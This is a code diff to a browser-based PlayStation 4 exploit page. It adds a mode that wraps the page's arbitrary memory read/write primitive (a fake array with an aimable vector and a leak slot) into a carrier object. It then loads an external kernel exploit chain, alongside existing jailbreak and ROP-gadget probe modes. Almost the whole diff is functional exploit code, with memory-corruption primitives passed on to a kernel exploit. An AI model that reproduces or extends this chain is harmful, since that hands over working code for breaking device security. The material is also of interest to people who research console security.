@@ -457,7 +457,7 @@ function printHeader() {
     logLine("   mansoor0x       - base HTML script", "info");
     logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
     logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
-    logLine(" Mode: post-R/W kernel probe (gadget/ROP/symbol enumeration)", "info");
+    logLine(" Mode: post-R/W probe (default) | ?kex=1 Poops chain | ?jb=1 sysent jailbreak", "info");
     logLine(headerBorder, "info");
 }
 
@@ -503,10 +503,12 @@ var LITE = Q.get("l") === "1";
 /* Post-R/W behaviour:
  *   default  → PROBE kernel (dump structs + scan for gadgets/ROP)
  *   ?jb=1    → run legacy kernel jailbreak instead
+ *   ?kex=1   → Poops kexploit (chain.mjs reuses this page's R/W — no kexploit.html)
  */
 var RUN_JAILBREAK = Q.get("jb") === "1";
+var RUN_KEX = Q.get("kex") === "1";
 
-var REVISION = "genuine-u8-rw-3-1352-probe";
+var REVISION = "genuine-u8-rw-4-1352-probe-kex";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -584,6 +586,8 @@ var compositionLength = 0;
 var compositionError = null;
 
 var globalFakeArray = null;
+var probeVectorHome = null;
+var kexploitStarted = false;
 var testRun = false;
 
 // ========== FIRMWARE DETECTION ==========
@@ -885,6 +889,8 @@ function loadHistoryCritical() {
 
         if (readObserved && writeObserved) {
             globalFakeArray = candidate;
+            probeVectorHome = new Uint8Array(8);
+            for (var pv = 0; pv < 8; ++pv) probeVectorHome[pv] = candidate[0x10 + pv];
             mark("FAKE-RETAINED", "candidate-conserved-on-vector-modification");
         }
 
@@ -978,7 +984,10 @@ function reportComposition() {
          * ------------------------------------------------------ */
         if (!testRun) {
             testRun = true;
-            if (RUN_JAILBREAK) {
+            if (RUN_KEX) {
+                mark("KEX-GATE", "probe-rw-then-poops-chain.mjs");
+                setTimeout(runKexploit, 500);
+            } else if (RUN_JAILBREAK) {
                 mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
                 setTimeout(runJailbreak, 500);
             } else {
@@ -1142,6 +1151,61 @@ function readBytes(addr, count) {
 
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
     return out;
+}
+
+// Carrier for kexploit/mem.mjs — fakeHost.q2 is the leak slot at hostAddress+0x20.
+function buildProbeCarrierForKex() {
+    if (!globalFakeArray || !probeVectorHome || !isFinite(hostAddress))
+        throw new Error("probe R/W not ready");
+    if (!fakeHost || fakeHost.q2 !== rwView)
+        throw new Error("fakeHost shape lost");
+
+    function aimProbeVector(address) {
+        var a = Number(address);
+        if (!plausibleCell(a)) throw new RangeError("aim: bad address " + a);
+        var low = a >>> 0;
+        var high = (a / 0x100000000) >>> 0;
+        for (var i = 0; i < 4; ++i) globalFakeArray[0x10 + i] = (low >>> (i * 8)) & 0xff;
+        for (var j = 0; j < 4; ++j) globalFakeArray[0x10 + 4 + j] = (high >>> (j * 8)) & 0xff;
+    }
+
+    return {
+        aim: aimProbeVector,
+        restore: function () {
+            for (var i = 0; i < 8; ++i) globalFakeArray[0x10 + i] = probeVectorHome[i];
+        },
+        get view() { return rwView; },
+        windowBytes: 0x100,
+        holder: fakeHost,
+        holderAddress: hostAddress,
+        leakSlotOffset: 0x20,
+        leakSlotAddress: hostAddress + 0x20,
+        setLeakSlot: function (value) { fakeHost.q2 = value; },
+        clearLeakSlot: function () { fakeHost.q2 = rwView; },
+        validate: plausibleCell,
+        assertHome: function () {
+            return rwView && rwMirror && targetView
+                && rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+        }
+    };
+}
+
+function runKexploit() {
+    if (kexploitStarted) return;
+    kexploitStarted = true;
+    try {
+        globalThis.__PS4_PROBE_CARRIER__ = buildProbeCarrierForKex();
+        mark("KEX-CARRIER", "host=" + hex(hostAddress) + "-window=0x100");
+        setStatus("running", "KEXPLOIT CHAIN", "loading kexploit/chain.mjs on probe R/W");
+        var el = document.createElement("script");
+        el.type = "module";
+        el.src = "./kexploit/chain.mjs?probe=1&v=index-bridge-1";
+        el.onerror = function () { mark("KEX-LOAD-FAIL", "chain.mjs module error"); };
+        document.body.appendChild(el);
+    } catch (error) {
+        mark("KEX-GATE-ERR", (error && error.message) || String(error));
+        setStatus("fail", "KEX GATE FAIL", String(error && error.message));
+    }
 }
 
 // ========== GADGET / ROP PATTERN TABLE ==========
@@ -1504,7 +1568,8 @@ function runJailbreak() {
 var attemptSucceeded = false;
 
 function runAttempt() {
-    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-post=" + (RUN_JAILBREAK ? "jb" : "probe"));
+    var postMode = RUN_KEX ? "kex" : (RUN_JAILBREAK ? "jb" : "probe");
+    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-post=" + postMode);
     try {
         buildAndStoreGraph();
         prepareAddrof();
@@ -1516,7 +1581,8 @@ function runAttempt() {
 
 try {
     document.getElementById("toolbarMeta").textContent =
-        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
+        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post "
+        + (RUN_KEX ? "KEX" : (RUN_JAILBREAK ? "JB" : "PROBE"));
 } catch (_) {}
 
 runAttempt();
